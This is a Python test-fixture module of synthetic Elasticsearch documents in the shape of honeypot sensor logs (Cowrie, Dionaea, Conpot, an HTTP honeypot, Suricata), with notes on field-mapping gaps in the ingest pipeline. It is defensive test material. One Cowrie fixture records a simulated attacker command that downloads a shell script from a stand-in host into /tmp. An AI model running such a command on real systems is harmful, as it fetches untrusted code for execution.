"""
Real-shaped Elasticsearch document fixtures for all 5 ml-worker source types
(#62 task 32), built from ground truth rather than assumption:

- The honeypot-v2-* wrapper shape (@timestamp / honeypot.* / source.* /
  destination.* / network.* / event.*) matches REAL_SHAPED_DOCUMENT in
  test_worker_audit.py, verified live against the homeserver Elasticsearch on
  2026-07-31.
- The geoip-honeypot ingest pipeline (analysis/elasticsearch-setup.sh) is the
  authoritative definition of which raw honeypot.* fields get promoted to
  which ECS fields -- read directly, not inferred.
- Each sensor's raw honeypot.* field names come from the sensor's own actual
  logging source, not documentation or memory:
    - cowrie: cowrie's stable, well-documented JSONlog format
      (cowrie.cfg enables [output_jsonlog]); eventid/src_ip/dst_port/
      username/password/input/duration/shasum/protocol are Cowrie's own
      field names.
    - dionaea: read directly from the dinotools/dionaea:latest image,
      /opt/dionaea/lib/dionaea/python/dionaea/log_json.py (flat connection
      log -> dionaea.json, what filebeat's generic ndjson parser reads) and
      log_incident.py (dionaea_incident.json, kept as raw `message`,
      deliberately NOT parsed per filebeat.yml's own comment).
    - conpot: read directly from the dtagdevsec/conpot:24.04 image,
      /usr/lib/python3.11/site-packages/conpot/core/loggers/json_log.py.
    - http-honeypot / multipot: this repo's own Go source
      (http-honeypot/main.go, multipot/main.go) -- exact json struct tags.
    - suricata: standard, stable Suricata EVE JSON (event_type/src_ip/
      dest_ip/dest_port/proto + per-type nested objects), matching
      analysis/filebeat.yml's suricata.eve.* target and the pipeline's own
      suricata-specific branch.

Every fixture is synthetic data in the real shape -- no captured attacker
indicators.

Three concrete, previously-undocumented ECS-promotion gaps found while
building these (see docs/ml-worker-plan.md §5.3 and issue #132, filed
against the ingest pipeline, not ml-worker itself):

1. Cowrie's own field is `protocol`, not `proto`. The geoip-honeypot pipeline
   only promotes `network.protocol` from `h.proto`, so it is never set for
   cowrie events specifically (multipot/http-honeypot do use `proto`, so
   they ARE promoted).
2. Dionaea's flat connection log (dionaea.json / log_json.py) has no
   `sensor` field and no `eventid` field. The pipeline's event.sensor logic
   is `if (h.sensor != null) ... else if (h.eventid startsWith cowrie.) ...`
   with no further fallback -- so plain dionaea connection events get NO
   event.sensor value at all. (Only the separate, unparsed
   dionaea_incident.json stream gets sensor=dionaea, via a static filebeat
   `fields:` block on that specific input -- but that stream's content stays
   inside `message` as a raw string, not structured fields.) A query
   filtered on event.sensor:dionaea will only see incidents, never plain
   connection events, and incidents are not field-parsed.
3. Conpot's json_log.py has no `sensor` field and no `proto` field at all
   (protocol info lives in `data_type`, e.g. "modbus"/"s7comm"/"http"). Its
   event.sensor is set purely from the log file path
   (`/logs/conpot-<variant>/`), and network.protocol is never populated by
   the generic h.proto branch.
"""

# ---------------------------------------------------------------------------
# 1. Cowrie (SSH/Telnet) -- honeypot-v2-*, event.sensor = "cowrie"
# ---------------------------------------------------------------------------
COWRIE_LOGIN_FAILED = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-cowrie-1",
    "_source": {
        "@timestamp": "2026-07-31T19:14:12.531Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "honeypot": {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-07-31T19:14:12.500Z",
            "session": "a1b2c3d4",
            "sensor": "cowrie",
            "src_ip": "203.0.113.9",
            "src_port": 51422,
            "dst_ip": "10.8.0.2",
            "dst_port": 22,
            "protocol": "ssh",
            "username": "admin",
            "password": "toor",
            "message": "login attempt [admin/toor] failed",
            "persona_id": "nexusai-gpu01",
            "site_id": "nexusai-berlin-ml",
            "asset_id": "gpu01",
            "organization": "NexusAI Research GmbH",
        },
        "source": {"ip": "203.0.113.9", "geo": {"country_iso_code": "CN"}},
        "destination": {"port": 22},
        # network.protocol NOT set -- see gap #1: cowrie writes "protocol", pipeline reads "proto"
        "user": {"name": "admin"},
        "event": {"sensor": "cowrie"},
    },
}

COWRIE_COMMAND_INPUT = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-cowrie-2",
    "_source": {
        "@timestamp": "2026-07-31T19:14:20.114Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "honeypot": {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-07-31T19:14:20.100Z",
            "session": "a1b2c3d4",
            "sensor": "cowrie",
            "src_ip": "203.0.113.9",
            "src_port": 51422,
            "dst_ip": "10.8.0.2",
            "dst_port": 22,
            "protocol": "ssh",
            "input": "wget http://198.51.100.20/x86.sh -O /tmp/x86.sh",
            "persona_id": "nexusai-gpu01",
            "site_id": "nexusai-berlin-ml",
            "asset_id": "gpu01",
            "organization": "NexusAI Research GmbH",
        },
        "source": {"ip": "203.0.113.9"},
        "destination": {"port": 22},
        "process": {"command_line": "wget http://198.51.100.20/x86.sh -O /tmp/x86.sh"},
        "event": {"sensor": "cowrie"},
    },
}

# ---------------------------------------------------------------------------
# 2. Dionaea -- honeypot-v2-*. Gap #2: connection events carry NO
#    event.sensor at all; only shown here as the raw honeypot.* shape would
#    actually appear, sensor intentionally absent from "event".
# ---------------------------------------------------------------------------
DIONAEA_CONNECTION_ACCEPT = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-dionaea-1",
    "_source": {
        "@timestamp": "2026-07-31T19:20:03.140Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "honeypot": {
            "connection": {"protocol": "smbd", "transport": "tcp", "type": "accept"},
            "dst_ip": "10.8.0.2",
            "dst_port": 445,
            "src_hostname": "",
            "src_ip": "198.51.100.7",
            "src_port": 39812,
            "timestamp": "2026-07-31T19:20:03.112Z",
            "persona_id": "meridian-legacy",
            "site_id": "meridian-hamburg-dc1",
            "asset_id": "legacy-svc-02",
            "organization": "Meridian Retail Systems Ltd.",
        },
        "source": {"ip": "198.51.100.7"},
        "destination": {"port": 445},
        # event.sensor intentionally absent -- see gap #2 in the module docstring
        "event": {},
    },
}

# The dionaea_incident.json stream, by contrast, DOES get event.sensor set
# (fields: {sensor: dionaea} on that specific filebeat input) but its
# content is never field-parsed -- it lands as a raw JSON string in
# honeypot.message, exactly per log_incident.py's actual output shape.
DIONAEA_INCIDENT_RAW = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-dionaea-2",
    "_source": {
        "@timestamp": "2026-07-31T19:20:05.900Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "event_format": "incident-json",
        "honeypot": {
            "message": (
                '{"timestamp": "2026-07-31T19:20:05.812", "name": "dionaea", '
                '"origin": "dionaea.modules.python.smb.dcerpc.request", "data": '
                '{"connection": {"protocol": "smbd", "transport": "tcp", '
                '"local_ip": "10.8.0.2", "local_port": 445, "remote_ip": '
                '"198.51.100.7", "remote_port": 39812}}}'
            ),
        },
        "sensor": "dionaea",
        "event": {"sensor": "dionaea"},
    },
}

# ---------------------------------------------------------------------------
# 3. Conpot (ICS/SCADA) -- honeypot-v2-*, event.sensor derived from log path,
#    not from any field in the event itself (json_log.py has no sensor key).
# ---------------------------------------------------------------------------
CONPOT_MODBUS_REQUEST = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-conpot-1",
    "_source": {
        "@timestamp": "2026-07-31T19:25:47.220Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "honeypot": {
            "timestamp": "2026-07-31T19:25:47.201000",
            "sensorid": "b6b9e0a2-conpot",
            "id": "req-77219",
            "src_ip": "192.0.2.44",
            "src_port": 54011,
            "dst_ip": "10.8.0.2",
            "dst_port": 502,
            "public_ip": None,
            "data_type": "modbus",
            "request": "read_holding_registers",
            "response": "[102, 87, 4501]",
            "event_type": None,
        },
        "source": {"ip": "192.0.2.44"},
        "destination": {"port": 502},
        # network.protocol NOT set -- see gap #3: conpot has data_type, not proto
        "ot": {"persona": "conpot-s7-1200"},
        "event": {"sensor": "conpot-s7-1200"},
    },
}

# ---------------------------------------------------------------------------
# 4. HTTP honeypot -- this repo's own Go service, honeypot-v2-*,
#    event.sensor = "http-honeypot" (h.sensor is set directly, per main.go).
# ---------------------------------------------------------------------------
HTTP_HONEYPOT_LOGIN_ATTEMPT = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-http-1",
    "_source": {
        "@timestamp": "2026-07-31T19:30:11.400Z",
        "pipeline": "honeypot",
        "logset": "sensors",
        "honeypot": {
            "time": "2026-07-31T19:30:11.380Z",
            "sensor": "http-honeypot",
            "persona_id": "meridian-customer-portal",
            "site_id": "meridian-public-web",
            "asset_id": "customer-portal-02",
            "organization": "Meridian Retail Systems Ltd.",
            "src_ip": "203.0.113.55",
            "method": "POST",
            "host": "portal.example.invalid",
            "path": "/wp-login.php",
            "user_agent": "Mozilla/5.0",
            "headers": {"content-type": "application/x-www-form-urlencoded"},
            "username": "admin",
            "password": "P@ssw0rd1",
            "auth_type": "form",
            "status": 200,
            "category": "credential_harvest",
        },
        "source": {"ip": "203.0.113.55"},
        "user": {"name": "admin"},
        "url": {"path": "/wp-login.php"},
        "event": {"sensor": "http-honeypot", "category": "credential_harvest"},
    },
}

# ---------------------------------------------------------------------------
# 5. Suricata / network -- suricata-v2-<event_type>-*, standard EVE JSON
#    nested under suricata.eve.* by filebeat, event.sensor = "suricata".
# ---------------------------------------------------------------------------
SURICATA_ALERT = {
    "_index": "suricata-v2-alert-2026.07.31",
    "_id": "fixture-suricata-1",
    "_source": {
        "@timestamp": "2026-07-31T19:33:02.010Z",
        "logset": "suricata",
        "pipeline": "honeypot",
        "suricata": {
            "eve": {
                "timestamp": "2026-07-31T19:33:02.001+0200",
                "event_type": "alert",
                "src_ip": "192.0.2.201",
                "src_port": 44231,
                "dest_ip": "10.8.0.2",
                "dest_port": 22,
                "proto": "TCP",
                "alert": {
                    "signature": "ET SCAN Potential SSH Scan",
                    "category": "Attempted Information Leak",
                    "severity": 2,
                    "signature_id": 2001219,
                },
            }
        },
        "source": {"ip": "192.0.2.201"},
        "destination": {"ip": "10.8.0.2", "port": 22},
        "network": {"transport": "tcp"},
        "event": {"sensor": "suricata", "category": "alert"},
    },
}

MALFORMED_MISSING_TIMESTAMP = {
    "_index": ".ds-honeypot-v2-2026.07.31-2026.07.31-000001",
    "_id": "fixture-malformed-1",
    "_source": {
        "honeypot": {"eventid": "cowrie.session.connect", "sensor": "cowrie"},
        "event": {"sensor": "cowrie"},
    },
}

ALL_REAL_DOCUMENTS = [
    COWRIE_LOGIN_FAILED,
    COWRIE_COMMAND_INPUT,
    DIONAEA_CONNECTION_ACCEPT,
    DIONAEA_INCIDENT_RAW,
    CONPOT_MODBUS_REQUEST,
    HTTP_HONEYPOT_LOGIN_ATTEMPT,
    SURICATA_ALERT,
]
